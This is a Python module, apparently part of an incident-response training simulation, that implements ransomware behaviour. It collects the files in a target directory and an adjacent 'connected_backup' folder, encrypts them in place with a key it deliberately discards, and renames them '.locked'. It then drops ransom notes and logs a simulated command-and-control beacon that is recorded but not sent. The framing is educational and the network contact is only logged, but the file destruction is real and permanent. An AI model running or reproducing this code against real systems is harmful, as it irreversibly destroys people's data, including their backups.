import json
import os
import time
from pathlib import Path
from queue import Queue
from threading import Event

from cryptography.fernet import Fernet


RANSOM_NOTE = """Your files have been encrypted.

This is a controlled academic simulation of a business-impacting cyber incident.
No payment channel exists and no external communication is performed.

Recommended response:
1. Isolate affected systems
2. Activate the incident response plan
3. Restore from verified backups
"""


def _write_event_snapshot(base_dir: Path, event_log: dict) -> None:
    snapshot_path = base_dir / "event_log.json"
    serializable = {key: value for key, value in event_log.items() if not key.startswith("_")}
    snapshot_path.write_text(json.dumps(serializable, indent=2, default=str), encoding="utf-8")


def _emit(ws_queue: Queue | None, message_type: str, message: str, timestamp: float | None = None) -> None:
    if ws_queue is None:
        return

    ws_queue.put_nowait(
        {
            "type": message_type,
            "message": message,
            "timestamp": timestamp or time.time(),
        }
    )


def _collect_target_files(target_dir: Path) -> list[Path]:
    file_list: list[Path] = []

    for root, _, files in os.walk(target_dir):
        root_path = Path(root)
        for filename in files:
            path = root_path / filename
            if path.name == "README_RANSOM.txt" or path.suffix == ".locked":
                continue
            file_list.append(path)

    connected_backup = target_dir.parent / "connected_backup"
    if connected_backup.exists():
        for root, _, files in os.walk(connected_backup):
            root_path = Path(root)
            for filename in files:
                path = root_path / filename
                if path.name == "README_RANSOM.txt" or path.suffix == ".locked":
                    continue
                file_list.append(path)

    return sorted(file_list)


def _drop_ransom_notes(target_dir: Path) -> None:
    for root, _, _ in os.walk(target_dir):
        directory = Path(root)
        if directory == target_dir:
            continue
        (directory / "README_RANSOM.txt").write_text(RANSOM_NOTE, encoding="utf-8")


def run_ransomware(
    target_dir: str,
    stop_event: Event,
    event_log: dict,
    ws_queue: Queue | None = None,
) -> None:
    base_dir = Path(target_dir).resolve().parent
    target_path = Path(target_dir).resolve()
    file_list = _collect_target_files(target_path)

    recon_time = time.time()
    event_log["recon"] = {
        "phase": "recon",
        "file_count": len(file_list),
        "timestamp": recon_time,
    }
    event_log["attack_stopped_by_watcher"] = False
    _write_event_snapshot(base_dir, event_log)
    _emit(ws_queue, "log", f"Reconnaissance complete. {len(file_list)} files identified across the target surface.", recon_time)

    # The key is intentionally kept in-memory only and never written to disk.
    # This ensures loss is genuine unless a usable backup exists.
    fernet = Fernet(Fernet.generate_key())
    encrypted_count = 0

    for filepath in file_list:
        if stop_event.is_set():
            event_log["attack_stopped_at"] = time.time()
            event_log["files_encrypted"] = encrypted_count
            event_log["attack_stopped_by_watcher"] = True
            _emit(ws_queue, "log", f"Attack halted after {encrypted_count} files were encrypted.", event_log["attack_stopped_at"])
            break

        with filepath.open("rb") as handle:
            data = handle.read()

        encrypted = fernet.encrypt(data)
        with filepath.open("wb") as handle:
            handle.write(encrypted)

        locked_path = filepath.with_suffix(filepath.suffix + ".locked")
        os.rename(filepath, locked_path)

        encrypted_count += 1
        event_log["last_encrypted"] = str(filepath)
        event_log["files_encrypted"] = encrypted_count
        event_log["last_encrypted_at"] = time.time()
        _write_event_snapshot(base_dir, event_log)
        _emit(
            ws_queue,
            "log",
            f"{encrypted_count} files encrypted. Latest item: {locked_path.relative_to(base_dir)}",
            event_log["last_encrypted_at"],
        )
        time.sleep(1.5)

    _drop_ransom_notes(target_path)
    c2_time = time.time()
    event_log["c2_beacon"] = {
        "phase": "c2_beacon",
        "destination": "185.220.xx.xx",
        "timestamp": c2_time,
    }
    event_log["attack_end"] = c2_time
    event_log["files_encrypted"] = encrypted_count
    _write_event_snapshot(base_dir, event_log)
    _emit(ws_queue, "log", "Ransom notes deployed across affected directories.", c2_time)
    _emit(ws_queue, "log", "Simulated command-and-control telemetry recorded.", c2_time)
